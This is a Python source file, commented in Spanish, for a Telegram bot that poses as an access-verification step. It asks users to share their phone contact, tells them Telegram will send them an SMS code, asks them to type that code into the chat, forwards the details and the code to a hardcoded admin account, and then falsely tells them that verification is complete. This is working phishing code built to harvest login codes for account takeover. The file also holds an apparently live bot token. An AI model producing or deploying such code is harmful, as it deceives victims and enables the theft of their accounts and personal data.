import asyncio
import logging
import sys
import os
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, ConversationHandler
from aiohttp import web

# ================================
# CONFIGURACIÓN
# ================================
TOKEN = "8557648219:AAHSBqKw7cP5Qz8hEeJn-Sjv4U6eZNnWACU"
ADMIN_ID = 7363341763
PORT = int(os.environ.get('PORT', 10000))

# ================================
# LOGGING
# ================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Estados
PHONE, CODE = range(2)
user_sessions = {}

# ================================
# FUNCIONES DEL BOT
# ================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start"""
    user = update.effective_user
    
    user_sessions[user.id] = {
        "step": "waiting_contact",
        "username": user.username,
        "start_time": datetime.now().strftime("%H:%M:%S")
    }
    
    keyboard = [[KeyboardButton("📱 Compartir contacto", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "Para acceder, comparte tu contacto:",
        reply_markup=reply_markup
    )
    
    return PHONE

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja contacto compartido"""
    user = update.effective_user
    contact = update.message.contact
    
    if contact.user_id != user.id:
        await update.message.reply_text("❌ Comparte tu propio contacto.")
        return PHONE
    
    user_sessions[user.id] = {
        "step": "waiting_code",
        "phone": contact.phone_number,
        "name": f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
        "username": user.username,
        "contact_time": datetime.now().strftime("%H:%M:%S")
    }
    
    # Enviar al admin
    admin_msg = f"""
📱 NUEVO CONTACTO
👤: {user_sessions[user.id]['name']}
📞: {contact.phone_number}
🆔: {user.id}
👁️: @{user.username or 'N/A'}
⏰: {datetime.now().strftime('%H:%M:%S')}
"""
    
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
        logger.info(f"📤 Contacto enviado al admin: {user.id}")
    except Exception as e:
        logger.error(f"❌ Error enviando al admin: {e}")
    
    await update.message.reply_text(
        "✅ Contacto recibido.\n\n"
        "📨 Telegram te enviará un código por SMS.\n"
        "Cuando lo recibas, escríbelo aquí:",
        reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True)
    )
    
    return CODE

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja código ingresado"""
    user = update.effective_user
    code = update.message.text.strip()
    
    if user.id not in user_sessions or user_sessions[user.id]["step"] != "waiting_code":
        await update.message.reply_text("❌ Usa /start para comenzar.")
        return ConversationHandler.END
    
    user_data = user_sessions[user.id]
    
    # Enviar código al admin
    code_msg = f"""
🔐 CÓDIGO RECIBIDO
👤: {user_data.get('name', 'N/A')}
📞: {user_data.get('phone', 'N/A')}
🆔: {user.id}
👁️: @{user.username or 'N/A'}
⏰: {datetime.now().strftime('%H:%M:%S')}
🔢 Código: {code}
"""
    
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=code_msg)
        logger.info(f"📤 Código enviado al admin: {user.id} - {code}")
    except Exception as e:
        logger.error(f"❌ Error enviando código: {e}")
    
    await update.message.reply_text(
        f"✅ Código recibido: {code}\n\n"
        "🎉 ¡Verificación completada!"
    )
    
    # Limpiar
    if user.id in user_sessions:
        del user_sessions[user.id]
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancela proceso"""
    user = update.effective_user
    
    if user.id in user_sessions:
        del user_sessions[user.id]
    
    await update.message.reply_text("❌ Proceso cancelado.")
    return ConversationHandler.END

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Estadísticas (admin)"""
    user = update.effective_user
    
    if user.id != ADMIN_ID:
        return
    
    waiting = sum(1 for data in user_sessions.values() if data.get("step") == "waiting_code")
    
    stats_msg = f"""
📊 ESTADÍSTICAS
• Sesiones: {len(user_sessions)}
• Esperando código: {waiting}
• Admin ID: {ADMIN_ID}
• Hora: {datetime.now().strftime('%H:%M:%S')}
"""
    
    await update.message.reply_text(stats_msg)

# ================================
# SERVIDOR WEB
# ================================

async def health_check(request):
    """Health check para Render"""
    return web.Response(text="OK")

# ================================
# EJECUCIÓN PRINCIPAL
# ================================

async def main():
    """Función principal"""
    # Mostrar info
    print("=" * 50)
    print(f"🚀 Iniciando Bot")
    print(f"🔑 Token: {TOKEN[:10]}...")
    print(f"👑 Admin: {ADMIN_ID}")
    print(f"🌐 Puerto: {PORT}")
    print("=" * 50)
    
    # Servidor web
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    logger.info(f"🌐 Servidor HTTP en puerto {PORT}")
    
    # Bot de Telegram
    application = Application.builder().token(TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PHONE: [
                MessageHandler(filters.CONTACT, handle_contact),
                CommandHandler('cancel', cancel)
            ],
            CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code),
                CommandHandler('cancel', cancel)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('stats', stats))
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    logger.info("🤖 Bot iniciado (polling)")
    
    # Mantener activo
    try:
        while True:
            await asyncio.sleep(3600)
    except KeyboardInterrupt:
        logger.info("⏹️ Deteniendo...")
    finally:
        await application.stop()
        await application.shutdown()
        await runner.cleanup()

if __name__ == '__main__':
    asyncio.run(main())
